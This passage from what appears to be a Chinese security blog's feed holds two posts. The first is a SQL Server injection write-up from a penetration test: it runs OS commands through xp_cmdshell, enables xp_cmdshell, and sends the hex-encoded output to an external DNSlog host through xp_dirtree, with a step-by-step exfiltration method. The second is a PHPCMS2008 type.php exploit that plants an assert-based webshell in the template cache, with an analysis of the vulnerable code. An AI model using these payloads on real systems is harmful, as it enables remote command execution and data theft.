</span></div><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure><p><strong>以上语句用来执行whoami，然后使用dnslog接收命令执行的结果，结果如图</strong><br><img src="http://pic.c1imber.top/blog/20190111/y4ATogsXvqnW.png" alt="mark"></p><p><strong>这几条语句大致的意思是首先创建一个临时表，之后使用<code>xp_cmdshell</code>这个存储过程去执行whoami并将命令执行的结果插入到这个临时表，然后查询临时表的内容并将查询结果通过<code>xp_dirtree</code>这个存储过程发送至dnslog，这里需要对结果进行16进制编码，因为UNC路径里不允许有一些特殊字符，至于为什么要使用这种方式呢，一是因为网站有防护，直接上sqlmap的话会被封ip影响渗透，二是因为该注入点只能通过盲注，布尔盲注和时间盲注的速度我就不说了，大家都懂的，通过结果可以看到可以成功的执行whoami，但是接下来问题就出现了，我在执行ipconfig的时候出现了意料之外的结果,首先需要获取命令执行结果的长度，因为在使用dnslog注入的时候，UNC路径的长度也有限制，不能超过128个字符，超出长度的话语句就会执行失败，语句如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">drop</span><span class="comment">/**/</span><span class="keyword">table</span><span class="comment">/**/</span>tt_tmp;<span class="comment">-- </span></div><div class="line">;<span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line">;<span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;<span class="comment">-- </span></div><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">cast</span>(<span class="keyword">len</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY))) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure><p><strong>语句的作用首先删除临时表，执行ipconfig并将命令执行的结果插入临时表，接着查询结果并进行16进制编码，并且获取长度，结果如下</strong></p><p><img src="http://pic.c1imber.top/blog/20190111/Q1gGLf0EFcSP.png" alt="mark"></p><p><strong>可以看到这里出现了一个奇怪的问题，获取到的长度仅仅为62字节，而ipconfig的输出肯定是比这个要长的，接下来把内容输出一下看看</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/pv73SFvb8xOF.png" alt="mark"></p><p><strong>可以看到并没有报错，成功接收到了结果，但是可以看出全是空白字符，这里猜测命令的执行结果是多行的，但是这里只获取了第一行结果的长度和内容</strong></p><p><strong>本地分析测试一波：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line"><span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/IKImOlhIrW2m.png" alt="mark"><br><strong>报错说禁止访问xp_cmdshell,开启一下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">',1;RECONFIGURE;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/C5kidFPi7UAT.png" alt="mark"><br><strong>现在可以了</strong><br><img src="http://pic.c1imber.top/blog/20190111/RrJ8rlemlQKn.png" alt="mark"><br><strong>重新插入，执行ipconfig</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line"><span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/h9VBVHwqDAsU.png" alt="mark"><br><strong>通过结果可以看到确实是这样子没错，在将命令的执行结果插入表中的时候遇到了换行符，所以将执行结果插入到了多行内,第一行为空字符</strong><br><img src="http://pic.c1imber.top/blog/20190111/96glQf7Y0h9L.png" alt="mark"></p><p><strong>解决办法：</strong></p><p><strong>创建表的时候增加主键，之后逐行查询，修改后的语句如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tt_tmp (<span class="keyword">id</span> <span class="built_in">INT</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">IDENTITY</span>,tmp1 <span class="keyword">nvarchar</span>(<span class="number">4000</span>));</div><div class="line"><span class="keyword">DECLARE</span> @code <span class="built_in">varchar</span>(<span class="number">4000</span>);<span class="keyword">SET</span> @code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span> <span class="keyword">into</span> tt_tmp(tmp1) exec master..xp_cmdshell @code;</div><div class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY));</div></pre></td></tr></table></figure><p><strong>再次查询一下经过16进制编码后的长度，发现长度依旧被截断到了 62字节,wtf!?</strong><br><img src="http://pic.c1imber.top/blog/20190111/JwNvgKzhUdrq.png" alt="mark"><br><strong>但是直接查询内容的话并没有发现内容被截断</strong><br><img src="http://pic.c1imber.top/blog/20190111/Q5R2SXMtXd2X.png" alt="mark"><br><strong>说明截断发生在了16进制转换的过程中，分析了一波发现原来是由于转化为二进制的时候没有给VARBINARY设置长度，所以转化成二进制的时候使用的是默认长度而导致后面的内容被截断了，修改一下语句</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>)));</div></pre></td></tr></table></figure><p><strong>没有再发生截断问题</strong><br><img src="http://pic.c1imber.top/blog/20190111/k8jMVa6v8aS4.png" alt="mark"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">cast</span>(<span class="keyword">len</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>)))) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>));</div></pre></td></tr></table></figure><p><strong>发现长度为512字节，后面多出的会由空格x20填充</strong></p><p><strong>之后通过一系列折腾，总结使用dnslog接收sqlserver执行命令结果的方法</strong></p><p><strong>第一步：创建临时表用于接收命令的执行结果，需要定义主键：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tt_tmp (<span class="keyword">id</span> <span class="built_in">INT</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">IDENTITY</span>,tmp1 <span class="keyword">nvarchar</span>(<span class="number">4000</span>));</div></pre></td></tr></table></figure><p><strong>第二步：将命令执行结果插入临时表：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">DECLARE</span> @code <span class="built_in">varchar</span>(<span class="number">4000</span>);<span class="keyword">SET</span> @code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span> <span class="keyword">into</span> tt_tmp(tmp1) exec master..xp_cmdshell @code;</div></pre></td></tr></table></figure><p><strong>第三步：由于插入了多行，首先需要获取行数(经过测试部分版本的sqlserver在UNC查询结果的位置不能有空格，需要去除空格，使用rtrim)：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>+(<span class="keyword">select</span> <span class="keyword">rtrim</span>(<span class="keyword">cast</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>))) <span class="keyword">from</span> tt_tmp)+<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div></pre></td></tr></table></figure><p><strong>第四步：将查询结果发送至dnslog(逐行读取，截取字符串)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">substring</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>))),<span class="number">1</span>,<span class="number">60</span>))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div></pre></td></tr></table></figure><p><strong>每次截取60个字符，直到截取完512个字符为止</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">substring</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>))),<span class="number">61</span>,<span class="number">60</span>))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div><div class="line">...</div><div class="line">...</div><div class="line">总共截取9次，可以写脚本完成</div><div class="line"></div><div class="line">1-60</div><div class="line">61-120</div><div class="line">121-180</div><div class="line">181-240</div><div class="line">241-300</div><div class="line">301-360</div><div class="line">361-420</div><div class="line">421-480</div><div class="line">481-512</div></pre></td></tr></table></figure><p><strong>第五步：删除临时表，用于接收下一次命令执行的结果</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">drop</span><span class="comment">/**/</span><span class="keyword">table</span><span class="comment">/**/</span>tt_tmp;<span class="comment">--</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;记一次dnslog接收异常分析&quot;&gt;&lt;a href=&quot;#记一次dnslog接收异常分析&quot; class=&quot;headerlink&quot; title=&quot;记一次dnslog接收异常分析&quot;&gt;&lt;/a&gt;记一次dnslog接收异常分析&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在一次渗透的过程中，遇到了sqlserver的注入点，在使用dnslog接收语句的执行结果时发现可以执行系统命令，但是在接收结果的时候遇到了些问题，问题如下&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://c1aysec.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://c1aysec.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>phpcms2008 type.php代码执行漏洞分析与复现</title>
    <link href="https://c1aysec.github.io/2018/12/21/phpcms2008%20type.php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://c1aysec.github.io/2018/12/21/phpcms2008 type.php代码执行漏洞/</id>
    <published>2018-12-21T12:21:50.000Z</published>
    <updated>2019-11-06T17:04:41.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpcms2008-type-php代码执行漏洞分析与复现"><a href="#phpcms2008-type-php代码执行漏洞分析与复现" class="headerlink" title="phpcms2008 type.php代码执行漏洞分析与复现"></a>phpcms2008 type.php代码执行漏洞分析与复现</h1><h3 id="phpcms2008安装问题："><a href="#phpcms2008安装问题：" class="headerlink" title="phpcms2008安装问题："></a>phpcms2008安装问题：</h3><p><strong>安装时出现如下错误</strong><br><img src="http://pic.c1imber.top/blog/20181221/QpCFWTtDJwoh.png" alt="mark"></p><p><strong>修改以下文件”TYPE=MyISAM”处，修改为”ENGINE=MyISAM”</strong></p><p><strong>php文件：</strong></p><pre><code>/ads/include/create.table.php/install.php/include/admin/global.func.php/include/admin/sql.func.php/install/install.php</code></pre><p><img src="http://pic.c1imber.top/blog/20181221/ymb5x1PwgDpL.png" alt="mark"><br><strong>以及所有的.sql文件，”TYPE=MyISAM”修改为”ENGINE=MyISAM”</strong><br><img src="http://pic.c1imber.top/blog/20181221/4nP9Llvw7Ml6.png" alt="mark"><br><strong>就可以安装成功了</strong><br><img src="http://pic.c1imber.top/blog/20181221/CrNRV2k4Fgqh.png" alt="mark"></p><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p><strong>payload:</strong></p><p><strong>在存在漏洞的网站后输入：</strong></p><pre><code>type.php?template=tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss</code></pre><p><img src="http://pic.c1imber.top/blog/20181221/OvkOxH3tP93B.png" alt="mark"><br><strong>之后将会在/data/cache_template/目录下生成rss.tpl.php文件，template的值被成功写入到该文件内，产生任意代码执行</strong></p><p><strong>接着访问：</strong></p><pre><code>/data/cache_template/rss.tpl.php?1=phpinfo();</code></pre><p><strong>即可执行phpinfo()</strong><br><img src="http://pic.c1imber.top/blog/20181221/U65J6DwPpbsA.png" alt="mark"></p><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><strong>根据payload可知入口点在type.php,重要代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/include/common.inc.php'</span>;</div><div class="line">......</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($template)) $template = <span class="string">'type'</span>;</div><div class="line">......</div><div class="line"><span class="keyword">include</span> template(<span class="string">'phpcms'</span>, $template);</div></pre></td></tr></table></figure><p><strong>其中$tamplate参数可控</strong></p><p><strong>下面来看/include/common.inc.php</strong></p><p><strong>重要代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_REQUEST)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(MAGIC_QUOTES_GPC)</div><div class="line">&#123;</div><div class="line">$_REQUEST = new_stripslashes($_REQUEST);</div><div class="line"><span class="keyword">if</span>($_COOKIE) $_COOKIE = new_stripslashes($_COOKIE);</div><div class="line">extract($db-&gt;escape($_REQUEST), EXTR_SKIP);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">$_POST = $db-&gt;escape($_POST);</div><div class="line">$_GET = $db-&gt;escape($_GET);</div><div class="line">$_COOKIE = $db-&gt;escape($_COOKIE);</div><div class="line">@extract($_POST,EXTR_SKIP);</div><div class="line">@extract($_GET,EXTR_SKIP);</div><div class="line">@extract($_COOKIE,EXTR_SKIP);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>)) $_REQUEST = filter_xss($_REQUEST, ALLOWED_HTMLTAGS);</div><div class="line"><span class="keyword">if</span>($_COOKIE) $db-&gt;escape($_COOKIE);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>以上的代码可用来接收传入的template，其中extract函数会对传入的GPC关联数组当中的键值对进行变量注册，其中EXTR_SKIP参数表示当变量名冲突时，不覆盖原有变量，所以当在GPC当中传入template参数时，传入的值会作为参数传入include template(‘phpcms’, $template)这里，跟进相关的函数，代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template</span><span class="params">($module = <span class="string">'phpcms'</span>, $template = <span class="string">'index'</span>, $istag = <span class="number">0</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line"><span class="keyword">if</span>(TPL_REFRESH &amp;&amp; (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>) &gt; @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/tag.inc.php'</span>) &gt; @filemtime($compiledtplfile)))</div><div class="line">&#123;</div><div class="line"><span class="keyword">require_once</span> PHPCMS_ROOT.<span class="string">'include/template.func.php'</span>;</div><div class="line">template_compile($module, $template, $istag);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $compiledtplfile;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>其中</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">'TPL_CACHEPATH'</span>, PHPCMS_ROOT.<span class="string">'data/cache_template/'</span>); <span class="comment">//模板缓存物理路径</span></div><div class="line">define(<span class="string">'TPL_ROOT'</span>, PHPCMS_ROOT.<span class="string">'templates/'</span>); <span class="comment">//模板保存物理路径</span></div><div class="line">define(<span class="string">'TPL_NAME'</span>, <span class="string">'default'</span>); <span class="comment">//当前模板方案目录</span></div></pre></td></tr></table></figure><p><strong>代码将传入的$template经过拼接后赋值给$compiledtplfile,此时$compiledtplfile的值变为了：</strong></p><pre><code>/data/cache_template/phpcms_tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss.tpl.php</code></pre><p><strong>这里的payload构造很有想象力，里这巧妙了利用了一个目录穿越的技巧，所以会将<code>phpcms_tag_(){};@unlink(_FILE_);assert($_GET[1]);{/</code>看成是一个目录，接着<code>../</code>则会跳过该目录</strong></p><p><strong>之后将路径传入file_exists检查文件是否存在，这里检查的文件路径实际上为：</strong></p><pre><code>/data/cache_template/rss.tpl.php</code></pre><p><strong>其中TPL_REFRESH为默认值1，并且/data/cache_template/rss.tpl.php这个文件是不存在的，所以符合条件，接着$tamplate被传入<code>template_compile($module, $template, $istag);</code>，跟进对应的函数</strong></p><p><strong>代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template_compile</span><span class="params">($module, $template, $istag = <span class="number">0</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">$tplfile = TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>;</div><div class="line">$content = @file_get_contents($tplfile);</div><div class="line"><span class="keyword">if</span>($content === <span class="keyword">false</span>) showmessage(<span class="string">"$tplfile is not exists!"</span>);</div><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line">$content = ($istag || substr($template, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">'tag_'</span>) ? <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span> : template_parse($content);</div><div class="line">$strlen = file_put_contents($compiledtplfile, $content);</div><div class="line">@chmod($compiledtplfile, <span class="number">0777</span>);</div><div class="line"><span class="keyword">return</span> $strlen;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>此时$temlate经过拼接赋值给了$tplfile，$tpfile的值变为了：</strong></p><pre><code>/templates/default/phpcms/tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss.html</code></pre><p><strong>之后<code>file_get_contents</code>会读取$tpfle这个文件的内容，如果文件不存在就会直接结束执行，但是这里的路径同样存在目录穿越的问题，实际上读取的路径为/templates/default/phpcms/rss.html这个文件，而这个文件是存在的，此处利用了路径穿越巧妙的绕过了此处的检查，之后<code>template_parse</code>函数将$tplfile文件当中的html代码编译成为php代码，然后和$template变量的内容拼接后写入到了$compiledtplfile这个文件中，也就是/data/cache<em>template/rss.tpl.php这个文件，这里要求template的前四个字符为`tag</em>`，payload的构造符合了要求，这时候php恶意代码就成功写入到了模板缓存文件内，产生了代码执行</strong></p><p><strong>写入的/data/cache_template/rss.tpl.php内的恶意代码为：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="function"><span class="keyword">function</span> <span class="title">_tag_phpcms_tag_</span><span class="params">()</span></span>&#123;&#125;;@unlink(_FILE_);assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);<span class="meta">?&gt;</span>'.template_parse($content, 1).'<span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20181221/nFxXup4DpuRj.png" alt="mark"></p><h3 id="关于payload构造的几个问题："><a href="#关于payload构造的几个问题：" class="headerlink" title="关于payload构造的几个问题："></a>关于payload构造的几个问题：</h3><p><strong>1.为什么加unlink？</strong></p><p><strong>其实可以不加，仔细看的话可以看到此处的unlink里面的参数书写的也不对并不会执行，加unlink的原因只是为了语法正确而已，经过测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tag_()&#123;&#125;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss也可以成功</span></div><div class="line">tag_()&#123;&#125;;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss会失败</span></div><div class="line">tag_()&#123;&#125;;php代码;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss成功</span></div></pre></td></tr></table></figure><p><strong>2.为什么加//</strong></p><p><strong>为了注释后面的代码，避免产生语法错误，不明白的可以看上图中的代码</strong></p><p><strong>3.{这个符号</strong></p><p><strong>因为后面的注释注释掉了{,所以需要加一个{去闭合代码最后的},否则会出语法错误</strong></p><h3 id="ayload构造"><a href="#ayload构造" class="headerlink" title="ayload构造:"></a>ayload构造:</h3><p><strong>1.简化后的payload：</strong></p><pre><code>type.php?template=tag_(){}assert($_GET[1]);{//../rss</code></pre><h3 id="漏洞总结："><a href="#漏洞总结：" class="headerlink" title="漏洞总结："></a>漏洞总结：</h3><p><strong>该漏洞可以总结为：代码根据传入的参数将/templates/default/phpcms目录下对应的.html模板文件渲染生成为/data/cache_template目录下.tpl.php模板缓存文件的这个过程中，由于输入是可控的，导致可以将php恶意代码写入php文件当中，从而产生任意代码执行</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;phpcms2008-type-php代码执行漏洞分析与复现&quot;&gt;&lt;a href=&quot;#phpcms2008-type-php代码执行漏洞分析与复现&quot; class=&quot;headerlink&quot; title=&quot;phpcms2008 type.php代码执行漏洞分析与复现&quot;&gt;
      
    
    </summary>
    
      <category term="代码审计" scheme="https://c1aysec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
